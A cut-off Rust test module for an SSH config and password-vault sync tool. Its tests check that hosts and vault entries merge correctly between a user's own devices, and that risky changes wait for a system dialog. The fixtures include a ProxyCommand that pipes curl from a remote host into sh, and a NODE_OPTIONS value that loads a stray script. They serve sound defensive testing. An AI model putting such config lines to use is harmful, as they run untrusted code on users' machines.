    }
}

fn count(n: usize) -> u32 {
    u32::try_from(n).unwrap_or(u32::MAX)
}

#[cfg(test)]
mod tests {
    use super::super::pairing::Purpose;
    use super::super::script::{Script, talk};
    use super::*;

    const LEFT: &str =
        "Host a\n    HostName 10.0.0.1\n    IdentityFile ~/.ssh/id_a\n\nHost *\n    User me\n";
    const RIGHT: &str = "Host b\n    HostName 10.0.0.2\n";

    fn synced(end: &PairingPhase) -> SyncSummary {
        match end {
            PairingPhase::Synced { summary } => summary.clone(),
            other => panic!("not synced: {other:?}"),
        }
    }

    fn sync(left: Script, right: Script) -> ((SyncSummary, Script), (SyncSummary, Script)) {
        let ((left_end, left), (right_end, right)) = talk(left, right, Purpose::Sync);
        ((synced(&left_end), left), (synced(&right_end), right))
    }

    fn set(side: &Script, config: &str) {
        *side.config.lock().unwrap() = SshConfig::parse(config);
    }

    #[test]
    fn hosts_go_both_ways_without_what_is_each_computers() {
        let ((left_sum, left), (right_sum, right)) = sync(
            Script::own("alice", "s", LEFT),
            Script::own("bob", "s", RIGHT),
        );
        assert_eq!((left_sum.added, right_sum.added), (1, 1));
        let (left_text, right_text) = (left.config_text(), right.config_text());
        // New hosts go before `Host *`.
        assert!(left_text.find("Host b").unwrap() < left_text.find("Host *").unwrap());
        assert!(right_text.contains("Host a\n    HostName 10.0.0.1\n"));
        assert!(!right_text.contains("IdentityFile"));
        assert!(!right_text.contains("Host *"));
        // Both now share a snapshot of both hosts.
        for side in [&left, &right] {
            let state = side.sync_state.lock().unwrap();
            assert_eq!(state.base.items.keys().collect::<Vec<_>>(), ["a", "b"]);
            assert!(state.synced.is_some());
        }

        // Next time only what changed comes over, the other way too.
        set(&right, &right_text.replace("10.0.0.1", "10.9.9.9"));
        let ((left_sum, left), (right_sum, _)) = sync(left, right);
        assert_eq!((left_sum.changed, right_sum.changed), (1, 0));
        assert!(
            left.config_text()
                .contains("HostName 10.9.9.9\n    IdentityFile ~/.ssh/id_a")
        );
    }

    #[test]
    fn project_records_go_both_ways() {
        let record = |id: &str, name: &str| ProjectRecord {
            id: id.into(),
            record: format!(r#"{{"name":{{"v":"{name}","t":1}},"color":{{"v":"blue","t":1}}}}"#),
        };
        let (left, right) = (
            Script::own("alice", "s", LEFT),
            Script::own("bob", "s", RIGHT),
        );
        let shop = record("6f1c2d3e-0000-4000-8000-000000000001", "Shop");
        let blog = record("6f1c2d3e-0000-4000-8000-000000000002", "Blog");
        *left.projects.lock().unwrap() = vec![shop.clone()];
        *right.projects.lock().unwrap() = vec![blog.clone()];
        let ((_, left), (_, right)) = sync(left, right);
        // Each side merges what the other sent into its vault.
        assert_eq!(*left.projects.lock().unwrap(), [blog]);
        assert_eq!(*right.projects.lock().unwrap(), [shop]);
    }

    #[test]
    fn a_conflict_is_settled_by_the_user_who_started() {
        let ((_, left), (_, right)) = sync(
            Script::own("alice", "s", LEFT),
            Script::own("bob", "s", RIGHT),
        );
        set(&left, &left.config_text().replace("10.0.0.2", "10.1.1.1"));
        set(&right, &right.config_text().replace("10.0.0.2", "10.2.2.2"));

        // Left for later: nothing changes, and it comes up again.
        let ((left_sum, mut left), (right_sum, right)) = sync(left, right);
        assert_eq!((left_sum.conflicts, right_sum.conflicts), (1, 1));
        assert!(left.config_text().contains("10.1.1.1"));
        assert!(
            left.shown
                .lock()
                .unwrap()
                .iter()
                .any(|(_, phase)| matches!(phase, PairingPhase::Decide { review } if review.conflicts.len() == 1))
        );

        left.decisions.theirs = vec!["b".into()];
        let ((left_sum, left), (right_sum, right)) = sync(left, right);
        assert_eq!((left_sum.conflicts, right_sum.conflicts), (0, 0));
        assert!(left.config_text().contains("10.2.2.2"));
        assert!(right.config_text().contains("10.2.2.2"));
        let (l, r) = (
            left.sync_state.lock().unwrap(),
            right.sync_state.lock().unwrap(),
        );
        assert_eq!(
            l.base.items.keys().collect::<Vec<_>>(),
            r.base.items.keys().collect::<Vec<_>>()
        );
    }

    #[test]
    fn a_risky_change_waits_for_the_user_of_each_computer() {
        let risky = "Host c\n    HostName 10.0.0.3\n    ProxyCommand ssh -W %h:%p bastion\n";
        // From the side that answered: the one that started asks its user.
        let mut left = Script::own("alice", "s", LEFT);
        left.decisions.apply = vec!["c".into()];
        let ((left_sum, left), (right_sum, right)) =
            sync(left, Script::own("bob", "s", &format!("{RIGHT}\n{risky}")));
        assert_eq!((left_sum.added, left_sum.deferred), (2, 0));
        assert!(
            left.config_text()
                .contains("ProxyCommand ssh -W %h:%p bastion")
        );
        assert_eq!(right_sum.deferred, 0);
        // The system dialog asked first, naming the directive.
        assert_eq!(
            *left.asked_risky.lock().unwrap(),
            [RiskyChange {
                id: "c".into(),
                lines: vec![RiskyLine {
                    key: "ProxyCommand".into(),
                    value: "ssh -W %h:%p bastion".into()
                }]
            }]
        );
        assert_eq!(right.asked_risky.lock().unwrap().len(), 0);

        // To the side that answered: put off there until its user syncs.
        let left_text = left.config_text().replace("Host c", "Host d");
        set(&left, &left_text);
        let ((left_sum, _), (right_sum, right)) = sync(left, right);
        assert_eq!(right_sum.deferred, 1);
        assert_eq!(left_sum.deferred_there, 1);
        assert!(!right.config_text().contains("Host d"));
    }

    #[test]
    fn the_system_dialog_not_the_page_lets_a_risky_change_in() {
        let risky = "Host c\n    ProxyCommand sh -c \"curl -s https://example.com/x | sh\"\n";
        let mut left = Script::own("alice", "s", LEFT);
        left.decisions.apply = vec!["c".into()];
        left.allows_risky = false;
        let ((left_sum, mut left), (_, right)) =
            sync(left, Script::own("bob", "s", &format!("{RIGHT}\n{risky}")));
        assert!(!left.config_text().contains("ProxyCommand"));
        assert_eq!((left_sum.added, left_sum.deferred), (1, 1));
        assert_eq!(left.asked_risky.lock().unwrap().len(), 1);

        // Not turned down: it comes up again, and goes in once allowed.
        left.allows_risky = true;
        let ((left_sum, left), _) = sync(left, right);
        assert_eq!((left_sum.added, left_sum.deferred), (1, 0));
        assert!(left.config_text().contains("ProxyCommand sh -c"));
    }

    #[test]
    fn a_conflict_settled_for_a_risky_version_needs_the_system_dialog() {
        let ((_, mut left), (_, right)) = sync(
            Script::own("alice", "s", LEFT),
            Script::own("bob", "s", RIGHT),
        );
        set(&left, &left.config_text().replace("10.0.0.2", "10.1.1.1"));
        set(
            &right,
            &right
                .config_text()
                .replace("10.0.0.2", "10.2.2.2\n    LocalCommand say hi"),
        );
        left.decisions.theirs = vec!["b".into()];
        left.allows_risky = false;
        let ((left_sum, mut left), (_, right)) = sync(left, right);
        // Neither version is taken: the conflict waits.
        assert_eq!(left_sum.conflicts, 1);
        assert!(left.config_text().contains("10.1.1.1"));
        assert!(!left.config_text().contains("LocalCommand"));
        let asked = left.asked_risky.lock().unwrap().clone();
        assert_eq!(asked.len(), 1);
        assert_eq!(
            (asked[0].id.as_str(), asked[0].lines[0].key.as_str()),
            ("b", "LocalCommand")
        );

        left.allows_risky = true;
        let ((left_sum, left), (right_sum, _)) = sync(left, right);
        assert_eq!((left_sum.conflicts, right_sum.conflicts), (0, 0));
        assert!(left.config_text().contains("LocalCommand say hi"));
    }

    #[test]
    fn the_system_dialog_lists_hosts_and_directives_as_ssh_reads_them() {
        let change = |id: &str, n: usize| RiskyChange {
            id: id.into(),
            lines: (0..n)
                .map(|i| RiskyLine {
                    key: "LocalCommand".into(),
                    value: format!("echo {i}\u{202E}"),
                })
                .collect(),
        };
        let (title, body, approve) =
            risky_prompt("Bob\u{200B}", "~/.ssh/config", &[change("prod", 2)]);
        assert_eq!(title.en, "Allow ssh to run this?");
        assert_eq!(approve.ru, "Разрешить и синхронизировать");
        assert!(
            body.en
                .contains("The sync with Bob<U+200B> adds to ~/.ssh/config")
        );
        assert!(
            body.en
                .contains("• Host prod: LocalCommand echo 0<U+202E>\n")
        );
        assert!(body.uz.contains("• Host prod: LocalCommand echo 1<U+202E>"));

        let (_, body, _) = risky_prompt("Bob", "config", &[change("a", 5), change("b", 6)]);
        assert_eq!(body.en.matches("• Host").count(), SHOWN_LINES);
        assert!(body.en.contains("…and 3 more"));
        assert!(body.ru.contains("…и ещё 3"));
        let long = "x".repeat(SHOWN_CHARS + 5);
        assert_eq!(shown(&long), format!("{}… (+5)", "x".repeat(SHOWN_CHARS)));
    }

    #[test]
    fn many_deletions_need_a_yes() {
        let many = (1..=6)
            .map(|n| format!("Host h{n}\n    HostName 10.0.1.{n}\n\n"))
            .collect::<Vec<_>>()
            .concat();
        let ((_, left), (_, right)) = sync(
            Script::own("alice", "s", &many),
            Script::own("bob", "s", ""),
        );
        assert_eq!(right.config_text().matches("Host h").count(), 6);
        set(&right, "");
        let ((left_sum, mut left), (_, right)) = sync(left, right);
        assert_eq!((left_sum.removed, left_sum.deferred), (0, 6));
        assert_eq!(left.config_text().matches("Host h").count(), 6);

        left.decisions.delete = true;
        let ((left_sum, left), _) = sync(left, right);
        assert_eq!(left_sum.removed, 6);
        assert_eq!(left.config_text().matches("Host h").count(), 0);
    }

    #[test]
    fn deletions_from_a_device_count_over_the_day() {
        let hosts = |numbers: std::ops::RangeInclusive<u32>| {
            numbers
                .map(|n| format!("Host h{n}\n    HostName 10.0.1.{n}\n\n"))
                .collect::<Vec<_>>()
                .concat()
        };
        let ((_, left), (_, right)) = sync(
            Script::own("alice", "s", &hosts(1..=6)),
            Script::own("bob", "s", ""),
        );
        // Three deletions go without asking, and are remembered.
        set(&right, &hosts(4..=6));
        let ((left_sum, mut left), (_, right)) = sync(left, right);
        assert_eq!((left_sum.removed, left_sum.deferred), (3, 0));
        let unasked: u32 = left
            .sync_state
            .lock()
            .unwrap()
            .unasked
            .iter()
            .map(|(_, n)| n)
            .sum();
        assert_eq!(unasked, 3);
        // Three more the same day: past the limit with the first three,
        // so the user decides on them; left alone, they wait.
        set(&right, "");
        let ((left_sum, mut left_after), (_, right)) = sync(left, right);
        assert_eq!((left_sum.removed, left_sum.deferred), (0, 3));
        assert_eq!(left_after.config_text().matches("Host h").count(), 3);
        assert!(
            left_after
                .shown
                .lock()
                .unwrap()
                .iter()
                .any(|(_, phase)| matches!(
                    phase,
                    PairingPhase::Decide { review } if review.deletions.len() == 3
                ))
        );
        left_after.decisions.delete = true;
        let ((left_sum, left_after), _) = sync(left_after, right);
        assert_eq!(left_sum.removed, 3);
        assert_eq!(left_after.config_text().matches("Host h").count(), 0);

        // A day later the count starts again.
        left = left_after;
        left.sync_state.lock().unwrap().unasked = vec![(
            OffsetDateTime::now_utc().unix_timestamp() - DELETION_WINDOW - 1,
            5,
        )];
        let now = OffsetDateTime::now_utc().unix_timestamp();
        assert_eq!(left.sync_state.lock().unwrap().recent_unasked(now), 0);
    }

    #[test]
    fn only_the_users_devices_with_the_vault_sync() {
        let mut stranger = Script::own("bob", "s", RIGHT);
        stranger.own_peer = false;
        let ((left_end, _), (right_end, right)) =
            talk(Script::own("alice", "s", LEFT), stranger, Purpose::Sync);
        let not_own = PairingPhase::Failed {
            reason: PairingFailure::NotOwn,
        };
        assert_eq!((&left_end, &right_end), (&not_own, &not_own));
        assert_eq!(right.config_text(), RIGHT);

        let ((left_end, _), _) = talk(
            Script::own("alice", "s", LEFT),
            Script::own("bob", "another vault", RIGHT),
            Purpose::Sync,
        );
        assert_eq!(left_end, not_own);

        // The port announced to own devices takes nothing but a sync.
        let mut announced = Script::own("bob", "s", RIGHT);
        announced.only_sync = true;
        let ((_, _), (right_end, _)) =
            talk(Script::new("alice", Some(true)), announced, Purpose::Pair);
        assert_eq!(right_end, not_own);
    }

    /// Two copies of one vault (with the key own devices share), each on
    /// a side whose entries sync, the first with a login `Mail`.
    fn vault_pair() -> (tempfile::TempDir, Script, Script, String) {
        use sshkm_core::SecretString;
        use sshkm_core::vault::{EntryInput, Vault, VaultPaths};
        let dir = tempfile::tempdir().unwrap();
        let paths = |name: &str| {
            let folder = dir.path().join(name);
            std::fs::create_dir_all(&folder).unwrap();
            VaultPaths::new(folder.join("vault.kdbx"))
        };
        let (a, b) = (paths("a"), paths("b"));
        let master = SecretString::from("master");
        let (mut vault, _) = Vault::create(&a, &master).unwrap();
        vault.make_own_key(&dir.path().join("a/backups")).unwrap();
        let mail = vault
            .add_entry(&EntryInput {
                title: "Mail".into(),
                password: Some(SecretString::from("p1")),
                ..EntryInput::default()
            })
            .unwrap();
        vault.save(&dir.path().join("a/backups")).unwrap();
        drop(vault);
        std::fs::copy(&a.database, &b.database).unwrap();
        std::fs::copy(&a.keys, &b.keys).unwrap();
        let side = |name: &'static str, paths: &VaultPaths, config: &str, folder: &str| {
            Script::with_vault(
                name,
                config,
                Vault::unlock(paths, &master).unwrap(),
                dir.path().join(folder).join("backups"),
            )
        };
        let left = side("alice", &a, LEFT, "a");
        let right = side("bob", &b, RIGHT, "b");
        (dir, left, right, mail)
    }

    fn add_login(side: &Script, title: &str) -> String {
        side.real_vault()
            .add_entry(&sshkm_core::vault::EntryInput {
                title: title.into(),
                ..sshkm_core::vault::EntryInput::default()
            })
            .unwrap()
    }

    fn title(side: &Script, id: &str) -> Option<String> {
        side.real_vault().entry(id).ok().map(|e| e.summary.title)
    }

    #[test]
    fn the_vault_syncs_by_entries_when_both_sides_do() {
        let (_dir, left, right, mail) = vault_pair();
        let shop = add_login(&left, "Shop");
        let blog = add_login(&right, "Blog");
        let ((left_sum, left), (right_sum, right)) = sync(left, right);
        assert_eq!(left_sum.vault.logins.added, 1);
        assert_eq!(right_sum.vault.logins.added, 1);
        assert_eq!((left_sum.vault_off, right_sum.vault_off), (None, None));
        assert_eq!(title(&right, &shop).as_deref(), Some("Shop"));
        assert_eq!(title(&left, &blog).as_deref(), Some("Blog"));
        // Both keep a snapshot of the same items.
        let keys = |side: &Script| -> Vec<String> {
            side.sync_state
                .lock()
                .unwrap()
                .vault
                .base
                .items
                .keys()
                .cloned()
                .collect()
        };
        assert_eq!(keys(&left), keys(&right));
        assert!(keys(&left).contains(&mail));

        // Next time, a change goes across; nothing else comes up.
        {
            let mut vault = left.real_vault();
            let detail = vault.entry(&mail).unwrap();
            vault
                .update_entry(
                    &mail,
                    &sshkm_core::vault::EntryInput {
                        title: detail.summary.title,
                        url: "https://mail.example".into(),
                        ..sshkm_core::vault::EntryInput::default()
                    },
                )
                .unwrap();
        }
        let ((left_sum, _), (right_sum, right)) = sync(left, right);
        assert_eq!(left_sum.vault, VaultCounts::default());
        assert_eq!(right_sum.vault.logins.changed, 1);
        assert_eq!(
            right.real_vault().entry(&mail).unwrap().summary.url,
            "https://mail.example"
        );
    }

    #[test]
    fn a_peer_without_entry_sync_syncs_hosts_only() {
        let (_dir, left, mut right, _) = vault_pair();
        let shop = add_login(&left, "Shop");
        right.entries = None;
        let ((left_sum, _), (right_sum, right)) = sync(left, right);
        assert_eq!(left_sum.vault_off, Some(VaultOff::Version));
        assert_eq!(right_sum.vault_off, None);
        assert_eq!((left_sum.added, right_sum.added), (1, 1));
        assert_eq!(title(&right, &shop), None);
    }

    #[test]
    fn a_vault_in_a_cloud_folder_is_left_to_the_cloud() {
        let (_dir, mut left, right, _) = vault_pair();
        let shop = add_login(&left, "Shop");
        left.entries = Some(EntrySync::Cloud {
            service: CloudService::Dropbox,
        });
        let ((left_sum, _), (right_sum, right)) = sync(left, right);
        let cloud = |here| {
            Some(VaultOff::Cloud {
                service: CloudService::Dropbox,
                here,
            })
        };
        assert_eq!(left_sum.vault_off, cloud(true));
        assert_eq!(right_sum.vault_off, cloud(false));
        assert_eq!(title(&right, &shop), None);
        assert_eq!(right_sum.added, 1);
    }

    #[test]
    fn vault_conflicts_and_many_deletions_are_the_users() {
        let (_dir, left, right, mail) = vault_pair();
        let doomed: Vec<String> = (0..7)
            .map(|n| add_login(&left, &format!("Old {n}")))
            .collect();
        let ((_, mut left), (_, right)) = sync(left, right);
        for id in &doomed {
            left.real_vault().trash_entry(id).unwrap();
        }
        let retitle = |side: &Script, to: &str| {
            side.real_vault()
                .update_entry(
                    &mail,
                    &sshkm_core::vault::EntryInput {
                        title: to.into(),
                        ..sshkm_core::vault::EntryInput::default()
                    },
                )
                .unwrap();
        };
        retitle(&left, "Mail (left)");
        retitle(&right, "Mail (right)");
        let right_versions = right.real_vault().entry(&mail).unwrap().history_len;
        // The user who started takes the other's version of the conflict;
        // the side that answers puts off the seven moves to the bin.
        left.decisions.vault_theirs = vec![mail.clone()];
        let ((left_sum, left), (right_sum, mut right)) = sync(left, right);
        assert_eq!(right_sum.deferred, 7);
        assert_eq!(left_sum.deferred_there, 7);
        assert!(
            doomed
                .iter()
                .all(|id| !right.real_vault().entry(id).unwrap().summary.in_trash)
        );
        assert_eq!(title(&left, &mail).as_deref(), Some("Mail (right)"));
        assert_eq!(title(&right, &mail).as_deref(), Some("Mail (right)"));
        // The version not kept stays among the entry's earlier versions,
        // on both sides: the side that kept its own has the other's too.
        assert!(left.real_vault().entry(&mail).unwrap().history_len >= 1);
        assert_eq!(
            right.real_vault().entry(&mail).unwrap().history_len,
            right_versions + 1
        );

        // Started from that side, its user sees them and lets them go.
        right.decisions.delete = true;
        let ((right_sum, right), _) = sync(right, left);
        assert_eq!(right_sum.vault.logins.removed, 7);
        assert!(
            doomed
                .iter()
                .all(|id| right.real_vault().entry(id).unwrap().summary.in_trash)
        );
        assert!(
            right
                .shown
                .lock()
                .unwrap()
                .iter()
                .any(|(_, phase)| matches!(
                    phase,
                    PairingPhase::Decide { review } if review.vault.deletions.len() == 7
                ))
        );
    }

    #[test]
    fn a_variable_that_loads_code_needs_the_system_dialog() {
        use sshkm_core::SecretString;
        use sshkm_core::vault::envs::{EnvInput, EnvVarInput};
        let (_dir, mut left, right, _) = vault_pair();
        let env = {
            let mut vault = right.real_vault();
            let env = vault
                .add_environment(&EnvInput {
                    project: None,
                    part: String::new(),
                    name: "dev".into(),
                    notes: String::new(),
                })
                .unwrap();
            vault
                .set_env_variable(
                    &env,
                    None,
                    &EnvVarInput {
                        name: "NODE_OPTIONS".into(),
                        value: Some(SecretString::from("--require /tmp/x.js")),
                        secret: false,
                        note: String::new(),
                    },
                )
                .unwrap();
            env
        };
        left.decisions.vault_apply = vec![env.clone()];
        left.allows_variables = false;
        let ((left_sum, left), _) = sync(left, right);
        assert_eq!(left_sum.deferred, 1);
        assert!(left.real_vault().environment(&env).is_err());
        let asked = left.asked_variables.lock().unwrap().clone();
        assert_eq!(asked.len(), 1);
        assert_eq!(asked[0].names, ["NODE_OPTIONS"]);
        assert_eq!(asked[0].environment, "dev");
    }

    #[test]
    fn the_variables_dialog_names_the_environment() {
        let (_, body, _) = variables_prompt(
            "MacBook",
            &[RiskyVariables {
                id: "x".into(),
                environment: "Shop · dev".into(),
                names: vec!["NODE_OPTIONS".into(), "PATH".into()],
            }],
        );
        assert!(body.en.contains("• Shop · dev: NODE_OPTIONS, PATH"));
        assert!(body.ru.contains("MacBook"));
    }
}
